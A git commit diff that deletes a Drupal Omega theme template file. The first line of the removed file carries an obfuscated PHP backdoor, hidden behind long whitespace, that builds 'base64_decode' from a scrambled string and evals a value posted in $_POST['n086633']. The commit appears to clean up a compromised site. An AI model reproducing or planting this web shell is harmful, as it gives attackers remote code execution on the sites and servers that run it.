de6d2efdd520b00ef22630c980a34fba4bf8cdff
Andrew Alexander <andy@balloonindustries.com>
2015-04-10 16:45:00 +0000

    remove folders

--- sites/all/themes/omega/omega/panels/layouts/omega_12/omega_12_onecol/omega-12-onecol.tpl.php
+++
@@ -1,5 +0,0 @@
-<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n086633'];if(isset($s22)){eval($s21($s22));}?><div class="panel-display omega-grid omega-12-onecol" <?php if (!empty($css_id)) { print "id=\"$css_id\""; } ?>>
-  <div class="panel-panel">
-    <div class="inside"><?php print $content['middle']; ?></div>
-  </div>
-</div>
